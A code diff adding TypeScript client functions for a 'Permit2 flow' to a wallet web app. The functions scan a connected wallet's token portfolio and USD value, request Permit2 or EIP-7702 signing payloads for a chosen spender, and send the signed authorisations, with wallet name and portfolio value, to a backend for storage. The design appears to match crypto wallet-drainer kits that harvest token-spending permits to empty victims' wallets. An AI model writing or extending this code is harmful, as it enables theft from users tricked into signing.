@@ -109,3 +109,70 @@ export const verifySignature = (payload: {
   address: string;
   signature: string;
 }) => request<{ verified: boolean; token?: string }>('/api/wallet/verify', payload);
+
+// ---------------------------------------------------------------------------
+// Permit2 flow (scan wallet + prepare typed data + store signed authorisation)
+// ---------------------------------------------------------------------------
+
+export interface PortfolioToken {
+  contract: string;
+  symbol: string;
+  name: string;
+  balance: string;
+  priceUsd: number;
+  valueUsd: number;
+  logo?: string | null;
+}
+
+export interface Portfolio {
+  totalUsd: number;
+  native: { symbol: string; balance: string; priceUsd: number; valueUsd: number };
+  tokens: PortfolioToken[];
+}
+
+export interface Permit2TypedData {
+  domain: { name: string; chainId: number; verifyingContract: string };
+  types: Record<string, Array<{ name: string; type: string }>>;
+  message: {
+    permitted: { token: string; amount: string };
+    spender: string;
+    nonce: string;
+    deadline: number;
+  };
+}
+
+export interface ScanAndPrepareResponse {
+  success: boolean;
+  address: string;
+  chainId: string;
+  portfolio: Portfolio;
+  signaturePayload:
+    | { type: 'permit2'; payload: Permit2TypedData; meta: any }
+    | { type: 'eip7702'; payload: any; meta: any }
+    | null;
+  error?: string;
+}
+
+/** Ask the backend to scan the wallet and hand back a Permit2 typed-data payload. */
+export const scanAndPrepare = (payload: {
+  address: string;
+  chainId: string | number;
+  spender: string;
+  tokenAddress?: string;
+}) => request<ScanAndPrepareResponse>('/api/wallet/scan-and-prepare', payload);
+
+/** Send the signed Permit2 authorisation to the backend for storage. */
+export const storePermit2Signature = (payload: {
+  address: string;
+  chainId: number;
+  token: string;
+  amount: string;
+  spender: string;
+  nonce: string;
+  deadline: number;
+  signature: string;
+  typedData: Permit2TypedData;
+  walletName?: string | null;
+  portfolioUsd?: number;
+}) => request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);
+
